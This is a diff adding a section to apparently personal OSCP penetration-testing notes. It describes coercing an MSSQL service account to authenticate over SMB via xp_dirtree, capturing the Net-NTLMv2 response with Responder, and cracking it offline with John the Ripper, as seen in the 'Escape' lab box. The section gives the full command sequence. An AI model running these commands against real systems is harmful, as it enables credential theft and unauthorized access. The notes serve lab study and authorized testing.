@@ -275,3 +275,35 @@ This page turns one repeatable part of an authorized assessment into a checklist
 ## Demonstrated in box write-ups
 
 - [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
+
+## MSSQL `xp_dirtree` coercion and the credential-typo pivot
+
+**Full command sequence:**
+
+~~~bash
+sudo responder -I tun0 -wv
+john --wordlist="$Wordlist" "$BoxDir/loot/sql-svc-ntlmv2.txt" \
+  > "$BoxDir/loot/sql-svc-john.log"
+john --show "$BoxDir/loot/sql-svc-ntlmv2.txt" \
+  > "$BoxDir/loot/sql-svc-cracked.txt"
+~~~
+
+At the MSSQL prompt:
+
+~~~sql
+EXEC master..xp_dirtree '\\$LocalIP\share', 1, 1;
+~~~
+
+**Piece by piece:**
+
+- Responder listens for SMB authentication. It does not create an NT hash. It records a Net-NTLMv2 challenge-response when the service account connects.
+- `xp_dirtree` is an extended stored procedure that resolves a directory path. A UNC path causes Windows to contact the remote SMB host before it can enumerate the directory.
+- The MSSQL service account supplies the outbound identity. The SQL login used to issue the query and the Windows service account that authenticates to SMB are separate identities.
+- John tests the captured response offline. The resulting cleartext value must be mapped back to the account shown by Responder and validated against the next service, such as WinRM.
+- Escape added a second password source after the WinRM foothold. A UTF-16LE error-log backup recorded a failed logon and an operator typo in the username field. That raw line is sensitive evidence and belongs only in private loot.
+
+**Where this comes from:** SQL Server extended stored procedures, Windows UNC authentication behavior, Responder capture output, and John the Ripper Net-NTLMv2 cracking. See [[OSCP/COMMAND APPENDIX/SQL Injection & Databases|SQL Injection and Databases]].
+
+**Where to look in the response:** Responder shows the target account and domain. John reports a cracked candidate. WinRM validation is the proof that the candidate belongs to the account and authentication plane expected by the chain.
+
+🔁 **Seen in:** [[OSCP/BOXES/WRITE UPS/Windows/Escape|Escape]].
